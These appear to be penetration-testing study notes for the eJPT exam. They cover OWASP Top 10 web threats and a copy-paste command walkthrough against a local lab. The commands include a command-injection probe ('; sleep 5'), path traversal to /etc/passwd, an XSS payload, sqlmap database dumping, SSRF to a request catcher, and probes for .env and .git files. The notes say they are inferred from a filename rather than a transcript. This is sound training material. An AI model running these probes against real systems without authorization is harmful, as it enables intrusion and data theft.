# Common Web Application Threats & Risks — eJPT Study Notes

Note: No transcript was provided for this specific video. The outline below is inferred from the filename and course folder (“01-Introduction to Web App Security Testing”). Commands and flows are conservative and aligned with typical eJPT/web app testing curricula. Use all commands only against systems you own or have explicit permission to test (ideally intentionally vulnerable labs like DVWA, OWASP Juice Shop, WebGoat, bWAPP).

## What the video covers (Introduction / big picture)
- Why web application security matters and how it fits into the eJPT methodology.
- Key terminology: asset, threat, vulnerability, exposure, impact, likelihood, risk (risk ≈ likelihood × impact).
- Common web application threats mapped to OWASP Top 10 (2021 focus):
  - Broken Access Control (IDOR, vertical/horizontal escalation)
  - Cryptographic Failures (weak TLS, poor key/cert handling, missing HSTS)
  - Injection (SQL, OS command, LDAP, template)
  - Insecure Design (threat modeling blind spots)
  - Security Misconfiguration (default creds, directory listing, verbose errors)
  - Vulnerable/Outdated Components (libraries, frameworks)
  - Identification & Authentication Failures (weak login, session issues)
  - Software/Data Integrity Failures (insecure CI/CD, deserialization)
  - Logging & Monitoring Failures (detection gaps)
  - SSRF (server-side request forgery)
- Mapping threats to test cases, evidence, and risk rating for reporting/triage.

## Flow (ordered)
1. Define risk and why business context matters (data classification, compliance, threat actors).
2. Review OWASP Top 10 categories and real-world patterns.
3. Identify attack surface: entry points, trust boundaries, and assumptions.
4. Plan tests: quick wins first (high-impact/low-effort checks), then deeper probes.
5. Use intercepting proxies and basic automation to validate findings.
6. Prioritize issues by impact and likelihood; document proof-of-concept responsibly.
7. Tie findings back to remediation and secure design principles.

## Tools highlighted
- Recon/fingerprinting:
  - Browser DevTools, Wappalyzer, WhatWeb
- Interception/proxy:
  - Burp Suite (Community), OWASP ZAP
- Enumeration/fuzzing:
  - gobuster/dirsearch/ffuf, wfuzz
- Scanning/baselines:
  - nmap (http-* NSE scripts), nikto
- Vulnerability-specific helpers:
  - sqlmap (SQLi), XSStrike/DalFox (XSS), nuclei (templates), testssl.sh/sslscan/sslyze (TLS)
- Wordlists:
  - SecLists, CeWL (custom lists)
- Misc:
  - curl (HTTP requests), git-dumper (if .git exposed), jwt_tool (JWT checks)

## Typical command walkthrough (detailed, copy-paste friendly)
All examples target a lab instance at 127.0.0.1. Replace variables as needed. Use only on authorized systems.

Setup
```
export TARGET=http://127.0.0.1:8080
export WORDLIST=/usr/share/seclists/Discovery/Web-Content/common.txt
export PARAMS_WORDLIST=/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

1) Recon and fingerprinting
```
# Quick port scan and HTTP discovery
nmap -p 80,443,8080,8443 --script=http-title,http-headers,http-methods,http-robots.txt -sV -Pn 127.0.0.1

# Web tech fingerprint
whatweb -v $TARGET

# Baseline headers and cookies
curl -kI $TARGET
curl -ksi $TARGET | grep -iE 'set-cookie|server|x-powered-by|strict-transport-security'
```

2) Content and endpoint discovery
```
# Directory brute force
gobuster dir -u $TARGET -w $WORDLIST -x php,asp,aspx,js,txt,json,zip,bak -t 40

# Alternative directory search
dirsearch -u $TARGET -w $WORDLIST -e php,asp,aspx,js,txt,json,zip,bak -t 40

# Parameter discovery on a page
ffuf -u "$TARGET/index.php?FUZZ=test" -w $PARAMS_WORDLIST -fs 0
```

3) Misconfiguration and quick checks
```
# Dangerous HTTP methods
curl -k -i -X OPTIONS $TARGET
nmap --script http-methods -p80,443 127.0.0.1

# Nikto baseline (noisy; use in lab)
nikto -h $TARGET

# Check robots.txt and backup files
curl -ks $TARGET/robots.txt
curl -ks $TARGET/.env
curl -ks $TARGET/.git/HEAD
```

4) Broken access control (IDOR)
```
# Probe predictable IDs (requires an authenticated cookie; example cookie var)
export COOKIE='PHPSESSID=YOURSESSION; security=low'
for i in $(seq 1 20); do
  curl -ks "$TARGET/api/users/$i" -H "Cookie: $COOKIE" -i | head -n 1
done
```

5) Injection: SQLi (example against DVWA or similar lab)
```
# Quick tamper test via curl (reflected errors or 500)
curl -ks "$TARGET/vulnerabilities/sqli/?id=1'&Submit=Submit" -H "Cookie: $COOKIE" | head

# Automated exploitation (lab only)
sqlmap -u "$TARGET/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="$COOKIE" --batch --dbs
```

6) Injection: OS command
```
# Time-based test (lab endpoint with param 'ip')
time curl -ks "$TARGET/vulnerabilities/exec/?ip=127.0.0.1; sleep 5&submit=Submit" -H "Cookie: $COOKIE"
```

7) XSS (reflected)
```
# Simple reflected XSS probe
curl -ks "$TARGET/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" -H "Cookie: $COOKIE"

# With common payload list
ffuf -u "$TARGET/search?q=FUZZ" -w /usr/share/seclists/Fuzzing/XSS/XSS-BruteLogic.txt -fs 0 -H "Cookie: $COOKIE"
```

8) CSRF indicators
```
# Inspect for anti-CSRF token presence and stability
curl -ks $TARGET/profile -H "Cookie: $COOKIE" | grep -i -E 'csrf|token|nonce'
```

9) Path traversal / LFI (lab only)
```
# Unix passwd file probe
curl -ks "$TARGET/download?file=../../../../etc/passwd" -H "Cookie: $COOKIE"

# Encoded variant
curl -ks "$TARGET/download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd" -H "Cookie: $COOKIE"
```

10) SSRF (lab only; use a request catcher like webhook.site)
```
export BIN_URL=https://webhook.site/your-unique-url
curl -ks "$TARGET/fetch?url=$BIN_URL" -H "Cookie: $COOKIE"
```

11) TLS and cryptography hygiene (if HTTPS)
```
# Quick TLS scan (choose one)
testssl.sh --fast https://127.0.0.1:8443
sslyze --regular 127.0.0.1:8443
```

12) Components and CVEs (fingerprint then template-scan; lab only)
```
nuclei -u $TARGET -tags cves -severity critical,high -rl 5
```

13) Sessions and cookies
```
# Check flags and scope
curl -kI $TARGET | grep -i set-cookie
# Look for Secure; HttpOnly; SameSite; Path; Domain
```

## Practical tips
- Always obtain written authorization. Prefer intentionally vulnerable labs for practice (DVWA, Juice Shop, WebGoat).
- Start with low-noise checks (headers, options, robots, cookies) before heavy scans.
- Use Burp/ZAP to record requests, then replay/modify in Repeater for precise testing.
- Normalize responses: track content length, status codes, response times to detect anomalies when fuzzing.
- For access control tests, create multiple accounts (user vs admin) and compare responses (differential testing).
- Keep payloads minimal first; escalate only as needed (e.g., ' vs ' OR 1=1--).
- Sanitize and store evidence securely; never include sensitive data in reports.
- Rate limit and throttle fuzzers to avoid denial of service; mind scope and hostnames.

## Minimal cheat sheet (one-screen flow)
```
# Target (lab)
export TARGET=http://127.0.0.1:8080; export COOKIE='PHPSESSID=XXX; security=low'

# Recon
whatweb -v $TARGET
nmap -p80,443 --script=http-title,http-headers,http-methods -sV -Pn 127.0.0.1
curl -kI $TARGET

# Content discovery
gobuster dir -u $TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,js,txt
dirsearch -u $TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt -e php,js,txt

# Misconfig quick wins
curl -k -i -X OPTIONS $TARGET
nikto -h $TARGET
curl -ks $TARGET/robots.txt

# Access control (IDOR)
for i in $(seq 1 10); do curl -ks "$TARGET/api/users/$i" -H "Cookie: $COOKIE" -I | head -n1; done

# SQLi (lab)
sqlmap -u "$TARGET/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="$COOKIE" --batch --dbs

# XSS quick probe
curl -ks "$TARGET/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" -H "Cookie: $COOKIE"

# LFI / traversal (lab)
curl -ks "$TARGET/download?file=../../../../etc/passwd" -H "Cookie: $COOKIE"

# TLS (if HTTPS)
testssl.sh --fast https://127.0.0.1:8443
```

## Summary
- The video introduces common web app threats and frames them through OWASP Top 10 and risk concepts (likelihood × impact).
- It emphasizes identifying attack surface, validating with proxies, and using lightweight automation for fast, reliable checks.
- Focus areas: access control, injection, misconfiguration, cryptography, components, authentication/session, SSRF, and logging/monitoring.
- Prioritize findings by business impact, document clearly, and recommend practical remediations.
- All hands-on testing must be performed only on authorized systems, ideally in lab environments.